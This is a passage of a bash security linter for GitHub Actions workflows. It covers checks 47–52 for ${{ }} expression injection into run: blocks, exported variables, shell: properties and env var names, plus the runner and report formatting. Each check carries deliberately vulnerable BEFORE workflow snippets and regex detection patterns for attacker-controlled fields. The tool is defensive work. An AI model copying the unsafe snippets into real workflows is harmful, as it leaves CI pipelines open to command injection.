# WHY: Beyond the commonly audited fields (PR title/body, issue body), many
# other github.event.* fields are attacker-controlled: release.body,
# client_payload.*, inputs.* (from dispatch), pusher.name/email, forkee.*,
# etc. These all undergo the same ${{ }} expansion and can inject commands.
#
# BEFORE (unsafe - additional event fields not covered by check 16):
  run: echo "${{ github.event.release.body }}"
  run: echo "${{ github.event.inputs.command }}"
  run: echo "${{ github.event.client_payload.data }}"
# AFTER (safe - use env var for all event data):
  env:
    RELEASE_BODY: ${{ github.event.release.body }}
    INPUT_CMD: ${{ github.event.inputs.command }}
    PAYLOAD: ${{ github.event.client_payload.data }}
  run: |
    echo "${RELEASE_BODY}"
    echo "${INPUT_CMD}"
    echo "${PAYLOAD}"
EOF
}

check_47() {
    local file="$1"
    # Additional event fields not covered by check 16
    local additional_fields='github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)'

    if grep -qE "${additional_fields}" "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)/ { print NR; next }
            in_run_block && /github\.event\.(release\.(name|body|tag_name|target_commitish|draft|prerelease|author\.(login|name))|inputs\.|client_payload\.|schedule|ref_type|pusher\.(name|email)|forced|created|deleted|pages\[|forkee\.|action|number)/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains additional attacker-controlled github.event field directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 48: Export statements with direct interpolation
# =============================================================================
check_48_description="export statements with direct interpolation"
check_48_severity="HIGH"

example_check_48() {
    cat <<'EOF'
# WHY: "export VAR="${{ inputs.* }}"" creates an env var that propagates to
# all child processes in the step. Unlike a step-level env: block (set by the
# runner before macro expansion), export in a run: block means the value was
# already ${{ }}-expanded into shell source — combining injection risk with
# broad propagation to every subprocess.
#
# BEFORE (unsafe - export creates env var from attacker input that propagates):
  run: |
    export BUILD_DIR="${{ inputs.build-dir }}"
    cd "${BUILD_DIR}" && make
# AFTER (safe - validate inputs before export, or use env: block):
  env:
    BUILD_DIR: ${{ inputs.build-dir }}
  run: |
    [[ "${BUILD_DIR}" =~ ^[a-zA-Z0-9_/-]+$ ]] || exit 1
    cd "${BUILD_DIR}" && make
EOF
}

check_48() {
    local file="$1"
    # Pattern to detect export statements with interpolation
    local export_pattern='export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{'

    local unsafe_usage
    unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
        /^[[:space:]]*(-[[:space:]]+)?run:/ && /export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{/ { print NR; next }
        in_run_block && /export[[:space:]]+[A-Za-z_][A-Za-z0-9_]*=.*\$\{\{/ { print NR }
    ' "${file}" 2>/dev/null)

    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Export statement contains direct \${{ }} interpolation - exported variable propagates to child processes" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 49: Dynamic 'shell:' property expressions
# =============================================================================
check_49_description="dynamic 'shell:' property expressions"
check_49_severity="MEDIUM"

example_check_49() {
    cat <<'EOF'
# WHY: The shell: property determines which interpreter runs the step's code.
# If an attacker controls this value, they can specify an arbitrary binary as
# the shell (e.g., a script they uploaded as an artifact), gaining code
# execution in the job's security context.
#
# BEFORE (unsafe - shell property controlled by attacker input):
  run: echo "hello"
  shell: ${{ inputs.custom_shell }}
# AFTER (safe - hardcode shell or validate against allowlist):
  run: echo "hello"
  shell: bash
EOF
}

check_49() {
    local file="$1"
    # Pattern to detect shell: with expression interpolation
    local shell_pattern='^[[:space:]]*shell:.*\$\{\{'

    local unsafe_usage
    unsafe_usage=$(grep -nE "${shell_pattern}" "${file}" 2>/dev/null || true)

    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "MEDIUM" "${file}" "'shell:' property contains expression interpolation - can execute arbitrary shell commands" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 50: env.* context interpolation in run blocks
# =============================================================================
check_50_description="env.* context interpolation in run blocks"
check_50_severity="HIGH"

example_check_50() {
    cat <<'EOF'
# WHY: ${{ env.MY_VAR }} is macro-expanded into the shell script at workflow-
# parse time, before the shell runs. The env var's value becomes shell source
# code, not a quoted string. The safe equivalent ${MY_VAR} is expanded by the
# shell at runtime and treated as data.
#
# BEFORE (unsafe - env variable is macro-expanded into shell code before execution):
  run: echo "${{ env.MY_VAR }}"
# AFTER (safe - reference as shell variable):
  run: echo "${MY_VAR}"
EOF
}

check_50() {
    local file="$1"
    if grep -qE '\$\{\{.*env\.' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*env\./ { print NR; next }
            in_run_block && /\$\{\{.*env\./ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains \${{ env.* }} directly in run: block - use shell variable like \$ENV_VAR instead to prevent injection" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 51: github.ref/github.ref_name interpolation in run blocks
# =============================================================================
check_51_description="github.ref/github.ref_name interpolation in run blocks"
check_51_severity="HIGH"

example_check_51() {
    cat <<'EOF'
# WHY: github.ref and github.ref_name contain the branch or tag name that
# triggered the workflow. In PRs, the branch name is controlled by the PR
# author, who can include shell metacharacters (backticks, $(), semicolons).
# When expanded via ${{ }} into a run block, these become executable shell syntax.
#
# BEFORE (unsafe - tag or branch name can contain shell metacharacters):
  run: echo "Ref: ${{ github.ref_name }}"
# AFTER (safe - shell variable is not re-parsed):
  env:
    REF_NAME: ${{ github.ref_name }}
  run: echo "Ref: ${REF_NAME}"
EOF
}

check_51() {
    local file="$1"
    if grep -qE '\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
            /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)/ { print NR; next }
            in_run_block && /\$\{\{.*github\.(ref|ref_name)([^a-zA-Z0-9_]|$)/ { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "Contains github.ref or github.ref_name interpolation directly in run: block - use env var instead" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 52: Dynamic environment variable names
# =============================================================================
check_52_description="dynamic environment variable names"
check_52_severity="HIGH"

example_check_52() {
    cat <<'EOF'
# WHY: When the env var *key* (not just value) is a ${{ }} expression, an
# attacker can set arbitrary environment variable names. This enables env-var
# pollution attacks — injecting LD_PRELOAD, BASH_ENV, PATH, or other
# security-sensitive variables that alter program behavior.
#
# BEFORE (unsafe - attacker controls env var name, enabling env pollution):
  env:
    ${{ inputs.env_name }}: ${{ inputs.env_value }}
# AFTER (safe - use static env var names):
  env:
    MY_VAR: ${{ inputs.env_value }}
EOF
}

check_52() {
    local file="$1"
    # Look for env blocks where the variable NAME (key) itself is an expression.
    # This is distinct from having expressions in values (which is normal).
    # Pattern: env block where a line starts with ${{ (the key is dynamic).
    local unsafe_env_names
    unsafe_env_names=$(awk '
        /^[[:space:]]*env:/ {
            in_env = 1
            env_indent = length($0) - length(ltrim($0))
            next
        }
        function ltrim(s) { sub(/^[[:space:]]+/, "", s); return s }
        in_env {
            # Calculate current indent
            cur = $0
            sub(/[^[:space:]].*/, "", cur)
            cur_indent = length(cur)

            # Exit env block if indent decreases to or below env: level
            if (NF > 0 && cur_indent <= env_indent && !/^[[:space:]]*$/) {
                in_env = 0
                next
            }

            # Only flag lines where the KEY itself is a ${{ expression
            # i.e., the line starts (after indent) with ${{ before any colon
            if (/^[[:space:]]*\$\{\{[^}]*\}\}[[:space:]]*:/) {
                print NR
            }
        }
    ' "${file}" 2>/dev/null)

    if [[ -n "${unsafe_env_names}" ]]; then
        log_issue "HIGH" "${file}" "Contains dynamic environment variable names via expression interpolation - can lead to environment variable pollution attacks" "$(_extract_lines "${unsafe_env_names}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check Runner
# =============================================================================

run_check() {
    local check_num="$1"
    local desc_var="check_${check_num}_description"
    local agg_var="check_${check_num}_aggregate"
    local example_fn="example_check_${check_num}"
    local check_fn="check_${check_num}"
    local found=0

    # Set global for log_issue to use
    CURRENT_CHECK="${check_num}"

    # Skip aggregate checks if requested
    if [[ "${SKIP_AGGREGATE}" == "true" && "${!agg_var:-}" == "true" ]]; then
        return
    fi

    # Only print status in normal mode
    if [[ "${MACHINE_OUTPUT}" != "true" ]]; then
        printf 'Checking for %s...\n' "${!desc_var}"
    fi

    if [[ "${!agg_var:-}" == "true" ]]; then
        if ! "${check_fn}" "${FILES[@]}"; then
            found=1
        fi
    else
        for file in "${FILES[@]}"; do
            if ! "${check_fn}" "${file}"; then
                found=1
            fi
        done
    fi

    # Only print examples in normal mode
    if [[ ${found} -eq 1 && "${MACHINE_OUTPUT}" != "true" ]]; then
        local example_output
        example_output=$( "${example_fn}" )
        log_fix_example "check_${check_num}" "${example_output}"
    fi
}

# =============================================================================
# Format Results (for parallel post-processing)
# =============================================================================

format_results() {
    local results_file="$1"
    # Use delimited string instead of associative array for bash 3.2 compat
    local _seen_checks="|"
    local total_issues=0

    if [[ ! -f "${results_file}" ]]; then
        printf 'Error: Results file not found: %s\n' "${results_file}" >&2
        exit 1
    fi

    # First pass: print all issues, track which checks had failures
    # Machine output format: CHECK<tab>SEVERITY<tab>FILE<tab>LINES<tab>MESSAGE
    while IFS= read -r _line; do
        [[ -z "${_line}" ]] && continue
        check="${_line%%$'\t'*}"
        _rest="${_line#*$'\t'}"
        severity="${_rest%%$'\t'*}"
        _rest="${_rest#*$'\t'}"
        file="${_rest%%$'\t'*}"
        _rest="${_rest#*$'\t'}"
        lines="${_rest%%$'\t'*}"
        message="${_rest#*$'\t'}"
        [[ -z "${check}" ]] && continue

        # Re-apply NOLINT filtering (defense-in-depth for parallel results)
        if [[ -n "${lines}" ]] && [[ -f "${file}" ]]; then
            lines=$(_filter_nolint "${lines}" "${file}" "${check}")
            [[ -z "${lines}" ]] && continue
        fi

        local file_display="${file}"
        if [[ -n "${lines}" ]]; then
            file_display="${file}:${lines}"
        fi

        local color="${YELLOW}"
        if [[ "${severity}" == "CRITICAL" ]] || [[ "${severity}" == "HIGH" ]]; then
            color="${RED}"
        fi
        printf '%b[%s]%b %s: %s\n' "${color}" "${severity}" "${NC}" "${file_display}" "${message}"

        case "${_seen_checks}" in
            *"|${check}|"*) ;;
            *) _seen_checks="${_seen_checks}${check}|" ;;
        esac
        total_issues=$((total_issues + 1))
    done < "${results_file}"

    # Second pass: print one example per unique failed check
    local _remaining="${_seen_checks#|}"
    while [[ -n "${_remaining}" ]]; do
        local check_num="${_remaining%%|*}"
        _remaining="${_remaining#*|}"
        [[ -z "${check_num}" ]] && continue
        local example_fn="example_check_${check_num}"
        if declare -f "${example_fn}" > /dev/null 2>&1; then
            local example_output
            example_output=$( "${example_fn}" )
            log_fix_example "check_${check_num}" "${example_output}"
        fi
    done

    echo ""
    echo "=========================================="
    echo "Scan Complete"
    echo "=========================================="
    echo ""

    if [[ ${total_issues} -eq 0 ]]; then
        printf '%bNo security issues found!%b\n' "${GREEN}" "${NC}"
        echo ""
    else
        printf '%bFound %s potential security issues%b\n' "${YELLOW}" "${total_issues}" "${NC}"
        echo ""
        echo "Remediation guidance:"
        echo "  - CRITICAL: Fix immediately - allows arbitrary code execution or secret exfiltration"
        echo "  - HIGH: Fix immediately - direct shell injection risk"
        echo "  - MEDIUM: Fix soon - potential injection or supply chain risk"
        echo "  - LOW: Defense in depth - address in regular maintenance"
        echo ""
    fi

    # Set exit code based on issues found
    if [[ "${STRICT_MODE}" == "true" && ${total_issues} -gt 0 ]]; then
        exit 1
    fi
    exit 0
}

# =============================================================================
# Main Execution
# =============================================================================

# Handle --format-results mode: read and display results from parallel run
if [[ -n "${FORMAT_RESULTS_FILE}" ]]; then
    echo "=========================================="
    echo "GitHub Actions Security Lint Check"
    echo "=========================================="
    echo ""
    format_results "${FORMAT_RESULTS_FILE}"
    # format_results exits, so this line is never reached
fi

# Print banner only in normal mode
if [[ "${MACHINE_OUTPUT}" != "true" ]]; then
    echo "=========================================="
    echo "GitHub Actions Security Lint Check"
    echo "=========================================="
    echo ""
fi

for i in "${CHECKS_TO_RUN[@]}"; do
    run_check "${i}"
done

# Print summary only in normal mode
if [[ "${MACHINE_OUTPUT}" != "true" ]]; then
    echo ""
    echo "=========================================="
    echo "Scan Complete"
    echo "=========================================="
    echo ""

    if [[ ${ISSUES_FOUND} -eq 0 ]]; then
        printf '%bNo security issues found!%b\n' "${GREEN}" "${NC}"
        echo ""
        exit 0
    else
        printf '%bFound %s potential security issues%b\n' "${YELLOW}" "${ISSUES_FOUND}" "${NC}"
        echo ""
        echo "Remediation guidance:"
        echo "  - CRITICAL: Fix immediately - allows arbitrary code execution or secret exfiltration"
        echo "  - HIGH: Fix immediately - direct shell injection risk"
        echo "  - MEDIUM: Fix soon - potential injection or supply chain risk"
        echo "  - LOW: Defense in depth - address in regular maintenance"
        echo ""
        echo "For more details, see the security remediation plan."
        echo ""

        if [[ "${STRICT_MODE}" == "true" ]]; then
            exit 1
        fi
        exit 0
    fi
fi

# In machine output mode, exit with appropriate code
if [[ "${STRICT_MODE}" == "true" && ${ISSUES_FOUND} -gt 0 ]]; then
    exit 1
fi
exit 0
